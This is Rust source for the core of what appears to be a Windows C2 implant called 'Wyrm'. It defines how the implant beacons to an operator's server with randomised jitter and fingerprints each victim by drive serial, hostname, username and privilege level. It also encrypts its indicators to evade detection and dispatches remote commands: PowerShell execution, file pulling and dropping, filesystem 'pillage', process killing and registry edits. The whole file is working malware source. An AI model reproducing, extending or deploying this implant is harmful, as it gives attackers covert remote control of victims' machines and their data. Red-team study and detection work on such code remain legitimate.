//! Wyrm represents the state and structure of the implant itself, including any functions
//! on the implant.

use std::{collections::VecDeque, path::PathBuf, process::exit, ptr::null_mut};

use rand::{Rng, rng};
use serde::Serialize;
use shared::{
    net::CompletedTasks,
    pretty_print::print_failed,
    tasks::{Command, FirstRunData, Task, WyrmResult, tasks_contains_kill_agent},
};
use str_crypter::{decrypt_string, sc};
use windows_sys::{
    Win32::{
        Foundation::{GetLastError, MAX_PATH},
        NetworkManagement::NetManagement::UNLEN,
        Storage::FileSystem::GetVolumeInformationW,
        System::{
            ProcessStatus::GetModuleFileNameExW,
            Threading::{GetCurrentProcess, GetCurrentProcessId},
            WindowsProgramming::{GetComputerNameW, GetUserNameW, MAX_COMPUTERNAME_LENGTH},
        },
    },
    core::{PCWSTR, PWSTR},
};

use crate::{
    comms::comms_http_check_in,
    native::{
        accounts::{ProcessIntegrityLevel, get_logged_in_username, get_process_integrity_level},
        filesystem::{
            MoveCopyAction, PathParseType, change_directory, dir_listing, drop_file_to_disk,
            move_or_copy_file, pillage, pull_file, rm_from_fs,
        },
        processes::{kill_process, running_process_details},
        registry::{reg_add, reg_del, reg_query},
        shell::run_powershell,
    },
    utils::time_utils::epoch_now,
};

pub struct RetriesBeforeExit {
    /// The time in seconds to sleep between failed connections on first connection
    pub failed_first_conn_sleep: u64,
    pub num_retries: u32,
}

/// `Wyrm` represents the implant itself.
pub struct Wyrm {
    /// The unique ID of the implant used to identify itself with the C2
    pub implant_id: String,
    /// The name assigned to the payload by the operator on creation, helps identify its type
    /// in the db.
    pub agent_name_by_operator: String,
    pub c2_config: C2Config,
    pub tasks: VecDeque<Task>,
    pub completed_tasks: CompletedTasks,
    pub current_working_directory: PathBuf,
    pub first_connection_retries: RetriesBeforeExit,
}

/// The C2 configuration settings for the implant; there can be any number of these
/// configurations, allowing for multiple C2 operations
pub struct C2Config {
    pub url: String,
    pub port: u16,
    pub api_endpoints: Vec<String>,
    pub sleep_seconds: u64,
    pub security_token: String,
    pub useragent: String,
    pub jitter: u64,
}

impl Wyrm {
    pub fn new() -> Self {
        // Translate and encrypt (where relevant) build artifacts into the binary through some
        // comptime functions
        let (
            sleep_seconds,
            api_endpoints,
            security_token,
            useragent,
            port,
            url,
            agent_name_by_operator,
            jitter,
        ) = translate_build_artifacts();

        Self {
            implant_id: build_implant_id(),
            c2_config: C2Config {
                url,
                port,
                api_endpoints,
                sleep_seconds,
                security_token,
                useragent,
                jitter,
            },
            tasks: VecDeque::new(),
            completed_tasks: vec![],
            // Get the current working directory in case the user wants to do some
            // powershell / other commands which rely on a position on the target
            // system.
            current_working_directory: {
                match std::env::current_dir() {
                    Ok(d) => d,
                    Err(_) => PathBuf::new(),
                }
            },
            first_connection_retries: RetriesBeforeExit {
                failed_first_conn_sleep: 1,
                num_retries: 3,
            },
            agent_name_by_operator,
        }
    }

    /// Command the implant to check in with the C2, making no attempt to send data. It will receive tasks from the C2
    /// and serialise them into the implants own task queue
    pub fn get_tasks_http(&mut self) {
        // Make a HTTP request to get any task(s) from the C2.
        // On failure, we will just return and not add any task to the queue.
        let tasks = match comms_http_check_in(self) {
            Ok(task) => task,
            Err(e) => {
                #[cfg(debug_assertions)]
                print_failed(format!("Error checking in with the C2. {e}"));
                return;
            }
        };

        for task in tasks {
            self.tasks.push_back(task);
        }
    }

    pub fn dispatch_tasks(&mut self) {
        if self.tasks.is_empty() {
            return;
        }

        // Check if the task contains the KillAgent command, if so, we just
        // outright kill it.
        if tasks_contains_kill_agent(&self.tasks) {
            // Killing the agent currently only supports killing the whole process.
            // If this was injected into another process, this will kill the host.
            // Threading injection support to be added in the future.
            std::process::exit(0);
        }

        //
        // Main command dispatcher
        //

        while let Some(task) = self.tasks.pop_front() {
            // This is quite noisy in debug builds, enable only if needed
            #[cfg(debug_assertions)]
            {
                use shared::pretty_print::print_info;

                print_info(format!(
                    "Dispatching task: {}, meta: {:?}, id: {}",
                    task.command, task.metadata, task.id
                ));
            }

            match task.command {
                Command::Sleep => {
                    // In the case of a sleep, its possible it will be in the task queue
                    // as a left over artifact somewhere. If that is the case and the queue is not
                    // empty, `continue` will continue us onto the next command to be processed,
                    // otherwise it will end the loop, and then enter the sleep period.
                    self.update_sleep_time(task.metadata);
                    continue;
                }
                Command::Ps => {
                    self.push_completed_task(&task, running_process_details());
                }
                Command::GetUsername => {
                    self.push_completed_task(&task, get_logged_in_username());
                }
                Command::Pillage => {
                    self.push_completed_task(&task, pillage());
                }
                Command::UpdateSleepTime => {
                    self.update_implant_sleep_time(task);
                }
                Command::Undefined => todo!(),
                Command::Pwd => {
                    let cwd = self
                        .current_working_directory
                        .clone()
                        .into_os_string()
                        .into_string()
                        .unwrap_or_default();
                    self.push_completed_task(&task, Some(cwd));
                }
                Command::AgentsFirstSessionBeacon => self.conduct_first_run_recon(),
                Command::Cd => {
                    let res = change_directory(self, &task.metadata);
                    self.push_completed_task(&task, res);
                }
                Command::KillAgent => {
                    std::process::exit(0);
                }
                Command::Ls => {
                    let res = dir_listing(&self.current_working_directory);
                    self.push_completed_task(&task, res);
                }
                Command::Run => {
                    let ps_output = run_powershell(&task.metadata, self);
                    self.push_completed_task(&task, ps_output);
                }
                Command::KillProcess => self.push_completed_task(&task, kill_process(&task)),
                Command::Drop => {
                    let f = drop_file_to_disk(&task.metadata, self);
                    self.push_completed_task(&task, f)
                }
                Command::Copy => {
                    // If the inner is Some (i.e. we sent the data from the client, then we gucci)
                    if let Some(inner) = &task.metadata {
                        let r = move_or_copy_file(self, inner, MoveCopyAction::Copy);
                        self.push_completed_task(&task, r);
                        continue;
                    }
                    // otherwise, complete the task but return an error
                    self.push_completed_task(
                        &task,
                        Some(WyrmResult::Err::<String>("Bad request".to_string())),
                    );
                }
                Command::Move => {
                    // If the inner is Some (i.e. we sent the data from the client, then we gucci)
                    if let Some(inner) = &task.metadata {
                        let r = move_or_copy_file(self, inner, MoveCopyAction::Move);
                        self.push_completed_task(&task, r);
                        continue;
                    }
                    // otherwise, complete the task but return an error
                    self.push_completed_task(
                        &task,
                        Some(WyrmResult::Err::<String>("Bad request".to_string())),
                    );
                }
                Command::RmFile => {
                    if let Some(inner) = &task.metadata {
                        let r = rm_from_fs(self, inner, PathParseType::File);
                        self.push_completed_task(&task, r);
                        continue;
                    } else {
                        self.push_completed_task(
                            &task,
                            Some(WyrmResult::Err::<String>("Bad request".to_string())),
                        );
                    }
                }
                Command::RmDir => {
                    if let Some(inner) = &task.metadata {
                        let r = rm_from_fs(self, inner, PathParseType::Directory);
                        self.push_completed_task(&task, r);
                        continue;
                    } else {
                        self.push_completed_task(
                            &task,
                            Some(WyrmResult::Err::<String>("Bad request".to_string())),
                        );
                    }
                }
                Command::Pull => {
                    if let Some(file_path) = &task.metadata {
                        match pull_file(&file_path, &self.current_working_directory) {
                            WyrmResult::Ok(res) => {
                                // Here we have the happy return path from the function which contains the
                                // bytes serialised as a string, we just need to pass the result into the
                                // completed task queue
                                self.push_completed_task(&task, Some(res));
                            }
                            WyrmResult::Err(e) => {
                                self.push_completed_task(&task, Some(e));
                            }
                        }
                    } else {
                        // We didn't receive the metadata, so return a bad request message
                        self.push_completed_task(
                            &task,
                            Some(WyrmResult::Err::<String>("Bad request.".into())),
                        );
                    }
                }
                Command::RegQuery => {
                    let result = reg_query(&task.metadata);
                    self.push_completed_task(&task, result);
                }
                Command::RegAdd => {
                    let result = reg_add(&task.metadata);
                    self.push_completed_task(&task, result);
                }
                Command::RegDelete => {
                    let result = reg_del(&task.metadata);
                    self.push_completed_task(&task, result);
                }
            }
        }
    }

    /// Updates the sleep time on the agent.
    fn update_sleep_time(&mut self, time_as_string: Option<String>) {
        let time: u64 = match time_as_string {
            Some(time_string) => match time_string.parse() {
                Ok(t) => t,
                Err(e) => {
                    #[cfg(debug_assertions)]
                    print_failed(format!("Could not deserialise sleep time to u64: {e}"));

                    return;
                }
            },
            None => return,
        };

        // At the moment we are only using 1 C2 configuration; hence indexing at zero, but in the future
        // it is planned to allow multiple C2 configurations to be made on the implant.
        self.c2_config.sleep_seconds = time;
        // print_info(format!("Sleep set to {time}"));
    }

    /// Pushes a completed task to the queue of tasks which have been completed between c2 connections.
    /// In the event that a task completed unsuccessfully and returned `None`, this function will return
    /// allowing execution to continue from where it was called.
    ///
    /// Otherwise, it will push the task to the completion queue pending upload.
    ///
    /// This function will serialise the T to a valid `Json String` via `serde_json`.
    ///
    /// # Args
    /// - `task`: The [`Task`] which is being completed,
    /// - `data`: An `Option` where the `T` must implement `Serialize`. This will be encoded ready for c2
    ///   communications
    /// - `implant`: A mutable reference to the implant so that the completed task queue can be modified.
    ///
    /// # Edge case
    /// In the event the function cannot serialise the data, it will return and nothing will be pushed to the
    /// queue, possibly resulting in silent failures. A debug print is made in this case, so can be caught
    /// when running in debug mode.
    ///
    /// This shouldn't happen, as `T: Serialize`.
    pub fn push_completed_task<T>(&mut self, task: &Task, data: Option<T>)
    where
        T: Serialize,
    {
        let id_bytes = task.id.to_le_bytes();
        let low = u16::from_le_bytes([id_bytes[0], id_bytes[1]]);
        let high = u16::from_le_bytes([id_bytes[2], id_bytes[3]]);

        let mut packet = vec![low, high];

        let (low, high) = task.command.to_u16_tuple_le();
        packet.push(low);
        packet.push(high);

        //
        // Finally serialise the completed time; theres probably a better way to write this..
        //
        let completed_time_bytes = epoch_now().to_le_bytes();
        let sec_1 = u16::from_le_bytes([completed_time_bytes[0], completed_time_bytes[1]]);
        let sec_2 = u16::from_le_bytes([completed_time_bytes[2], completed_time_bytes[3]]);
        let sec_3 = u16::from_le_bytes([completed_time_bytes[4], completed_time_bytes[5]]);
        let sec_4 = u16::from_le_bytes([completed_time_bytes[6], completed_time_bytes[7]]);

        packet.push(sec_1);
        packet.push(sec_2);
        packet.push(sec_3);
        packet.push(sec_4);

        //
        // Write the data into the packet if it exists
        //
        if let Some(d) = &data {
            let data = match serde_json::to_string(&d) {
                Ok(inner) => inner,
                Err(e) => {
                    #[cfg(debug_assertions)]
                    println!(
                        "[-] Error serialising data to be pushed to the completed task queue. {e}"
                    );

                    return;
                }
            };

            let mut data_bytes: Vec<u16> = data.encode_utf16().collect();
            packet.append(&mut data_bytes);
        }

        self.completed_tasks.push(packet);
    }

    /// Update the implant sleep time across **all** C2 configurations stored in the implant
    fn update_implant_sleep_time(&mut self, task: Task) {
        let new_sleep_time = match task.metadata {
            Some(time_as_string) => match time_as_string.parse::<u64>() {
                Ok(parsed) => parsed,
                Err(e) => {
                    #[cfg(debug_assertions)]
                    println!("[-] Error parsing new sleep time. {e}");
                    return;
                }
            },
            None => return,
        } as u64;

        self.c2_config.sleep_seconds = new_sleep_time;
    }

    pub fn conduct_first_run_recon(&mut self) {
        //
        // Get the additional metadata we want to send up to the C2
        //

        let pid: u32 = unsafe { GetCurrentProcessId() };

        let process_name = unsafe {
            let handle = GetCurrentProcess();
            // NOTE: This is mutable in the Win fn
            let buf = [0u16; MAX_PATH as _];
            let len = GetModuleFileNameExW(
                handle,
                null_mut(),
                PWSTR::from(buf.as_ptr() as *mut _),
                buf.len() as u32,
            );

            // In the event of an error, we will just send "unknown" to the server
            if len == 0 {
                #[cfg(debug_assertions)]
                print_failed(format!(
                    "Failed to get module file name. Last error: {}",
                    GetLastError()
                ));

                sc!("unknown", 178).unwrap()
            } else {
                String::from_utf16_lossy(&buf)
            }
        };

        let first_run = FirstRunData {
            a: self.current_working_directory.clone(),
            b: pid,
            c: process_name,
            d: self.agent_name_by_operator.clone(),
            e: self.c2_config.sleep_seconds,
        };

        let task = Task::from(0, Command::AgentsFirstSessionBeacon, None);

        self.push_completed_task(&task, Some(first_run));
    }
}

/// Builds the implant ID, in the form: serial_hostname_username. The serial number associated with the
/// ID is that of the HDD/SSD so should create a unique fingerprint for each target.
fn build_implant_id() -> String {
    // get the serial of the drive
    let mut buf: u32 = 0;
    let serial = if unsafe {
        GetVolumeInformationW(
            PCWSTR::from(null_mut()),
            PWSTR::from(null_mut()),
            0,
            &mut buf,
            null_mut(),
            null_mut(),
            PWSTR::from(null_mut()),
            0,
        )
    } != 0
    {
        format!("{buf}")
    } else {
        sc!("no_serial", 176).unwrap()
    };

    let hostname = get_hostname();

    let username = {
        // Note: This buffer is not marked mut, but will be mutated through a raw pointer.
        // We set the length of the buffer via an input len param below.
        let buf = [0u16; UNLEN as usize];
        let mut len: u32 = UNLEN;
        let result = unsafe { GetUserNameW(PWSTR::from(buf.as_ptr() as *mut _), &mut len) };

        if result == 0 || len == 0 {
            sc!("UNKNOWN", 56).unwrap()
        } else {
            String::from_utf16_lossy(&buf[0..len as usize - 1])
        }
    };

    let integrity = get_process_integrity_level().unwrap_or(ProcessIntegrityLevel::Unknown);

    let pid = unsafe { GetCurrentProcessId() };

    format!("{hostname}_{serial}_{username}_{integrity}_{pid}")
}

pub fn get_hostname() -> String {
    const LEN: usize = MAX_COMPUTERNAME_LENGTH as usize + 1;
    let mut buf = vec![0; LEN];
    let mut size: u32 = LEN as u32;

    if unsafe { GetComputerNameW(PWSTR::from(buf.as_mut_ptr()), &mut size) } != 0 {
        let slice = &buf[..size as usize];
        String::from_utf16_lossy(slice)
    } else {
        sc!("err_username", 104).unwrap()
    }
}

type SleepSeconds = u64;
type ApiEndpoint = Vec<String>;
type SecurityToken = String;
type Useragent = String;
type Port = u16;
type URL = String;
type AgentNameByOperator = String;
type Jitter = u64;

/// Translates build artifacts passed to the compiler by the build environment variables
/// taken from the profile
fn translate_build_artifacts() -> (
    SleepSeconds,
    ApiEndpoint,
    SecurityToken,
    Useragent,
    Port,
    URL,
    AgentNameByOperator,
    Jitter,
) {
    // Note: This doesn't leave traces in the binary (other than unencrypted IOCs to be encrypted in a
    // upcoming small update). We use `option_env!()` to prevent rust-analyzer from having a fit - whilst
    // this could allow bad data, we prevent this at compile time with unwrap().
    let sleep_seconds: u64 = option_env!("DEF_SLEEP_TIME").unwrap().parse().unwrap();
    const URL: &str = option_env!("C2_HOST").unwrap_or_default();
    const API_ENDPOINT: &str = option_env!("C2_URIS").unwrap_or_default();
    const SECURITY_TOKEN: &str = option_env!("SECURITY_TOKEN").unwrap_or_default();
    const AGENT_NAME: &str = option_env!("AGENT_NAME").unwrap_or_default();
    const USERAGENT: &str = option_env!("USERAGENT").unwrap_or_default();
    let port: u16 = option_env!("C2_PORT").unwrap().parse().unwrap();
    let jitter: Jitter = option_env!("JITTER").unwrap().parse().unwrap();

    // to make the compiler comply, we have to construct the above including a default
    // value if the env var was not present, we want to check for those default values
    // and quit if they are present as that is considered a fatal error.
    if URL.is_empty() {
        #[cfg(debug_assertions)]
        print_failed("URL was empty");

        exit(0);
    }

    if API_ENDPOINT.is_empty() {
        #[cfg(debug_assertions)]
        print_failed("API_ENDPOINT was empty");

        exit(0);
    }

    if SECURITY_TOKEN.is_empty() {
        #[cfg(debug_assertions)]
        print_failed("SECURITY_TOKEN was empty");

        exit(0);
    }

    if USERAGENT.is_empty() {
        #[cfg(debug_assertions)]
        print_failed("USERAGENT was empty");

        exit(0);
    }

    //
    // Encrypt the relevant IOCs into the binary
    //
    let url = sc!(URL, 41).unwrap();
    let useragent = sc!(USERAGENT, 49).unwrap();
    let agent_name_by_operator = sc!(AGENT_NAME, 128).unwrap();
    let security_token = sc!(SECURITY_TOKEN, 153).unwrap();

    // The API endpoints are encoded as a csv; so we need to construct a Vec from that
    let api_endpoints = API_ENDPOINT
        .split(',')
        .map(|s| s.to_string())
        .collect::<Vec<String>>();

    (
        sleep_seconds,
        api_endpoints,
        security_token,
        useragent,
        port,
        url,
        agent_name_by_operator,
        jitter,
    )
}

pub fn calculate_sleep_seconds(wyrm: &Wyrm) -> u64 {
    // If no jitter set, or is 0 - sleep normal amount
    if wyrm.c2_config.jitter == 0 {
        return wyrm.c2_config.sleep_seconds;
    }

    // Validate jitter percentage is in bounds
    if wyrm.c2_config.jitter > 100 || wyrm.c2_config.jitter < 1 {
        #[cfg(debug_assertions)]
        print_failed(&format!("Invalid jitter %. Got: {}", wyrm.c2_config.jitter));

        return wyrm.c2_config.sleep_seconds;
    }

    let base = wyrm.c2_config.sleep_seconds;
    let jit_percent = wyrm.c2_config.jitter;

    // Calculate the minimum sleep from the jitter percentage
    // Use checked mul to make sure we don't overflow, if we do, just sleep the
    // fixed amount set on the agent.
    let min_sleep = match base.checked_mul(100 - jit_percent) {
        Some(m) => m / 100,
        None => {
            #[cfg(debug_assertions)]
            print_failed(&format!(
                "Int overflow in mul calculating jitter. Base was: {base}"
            ));

            return wyrm.c2_config.sleep_seconds;
        }
    };

    let mut rng = rng();
    rng.random_range(min_sleep..=wyrm.c2_config.sleep_seconds)
}
